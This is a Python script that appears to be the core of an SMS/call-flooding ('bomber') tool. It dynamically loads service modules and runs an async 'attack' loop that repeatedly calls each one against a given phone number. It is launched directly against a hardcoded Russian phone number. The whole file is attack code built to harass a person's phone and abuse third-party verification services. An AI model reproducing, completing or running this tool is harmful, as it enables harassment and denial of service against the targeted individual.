import requests
import os
import sys
import inspect
from datetime import datetime
from asyncio import CancelledError
from status import status
import sentry_sdk
import aiohttp.client_exceptions
import asyncio

API_REQUIRED_PARAMS = ["number_of_cycles", "phone_code", "phone"]

def load_services():
    services = os.listdir("services")
    sys.path.insert(0, "services")
    service_classes = {}

    for service in services:
        if service.endswith(".py") and service != "service.py":
            module = __import__(service[:-3])
            for member in inspect.getmembers(module, inspect.isclass):
                if member[1].__module__ == module.__name__:
                    service_classes[module] = member[0]

    return service_classes

async def attack(number_of_cycles: int, phone_code: str, phone: str):
    status["started_at"] = datetime.now().isoformat()
    for cycle in range(number_of_cycles):
        for i, a in enumerate(load_services().items()):
            print(1)
            module, service = a
            status["currently_at"] = (i + 1) * (cycle + 1)
            try:
                supported_phone_codes = getattr(module, service).phone_codes
                if len(supported_phone_codes) == 0 or phone_code in supported_phone_codes:
                    await getattr(module, service)(phone, phone_code).run()
            except (TimeoutError, CancelledError, aiohttp.ClientError):
                continue
            except ValueError as error:
                sentry_sdk.capture_exception(error)
                continue
    status["started_at"] = None
    status["currently_at"] = None

async def start_attack():
    await attack(1, "ru", "9021897706")

asyncio.run(start_attack())

